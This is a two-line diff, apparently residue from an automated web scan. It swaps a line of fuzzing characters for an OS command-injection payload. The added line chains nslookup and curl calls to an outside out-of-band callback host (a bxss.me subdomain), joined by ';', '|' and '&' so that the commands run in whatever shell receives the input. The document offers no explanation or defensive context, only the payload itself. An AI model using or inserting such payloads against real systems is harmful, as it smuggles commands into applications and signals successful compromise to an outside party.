@@ -1,2 +1,1 @@
-12345'"\'\");|]*{
-<>�''💡
+;(nslookup -q=cname hitintboyuqxi4c286.bxss.me||curl hitintboyuqxi4c286.bxss.me)|(nslookup -q=cname hitintboyuqxi4c286.bxss.me||curl hitintboyuqxi4c286.bxss.me)&(nslookup -q=cname hitintboyuqxi4c286.bxss.me||curl hitintboyuqxi4c286.bxss.me)
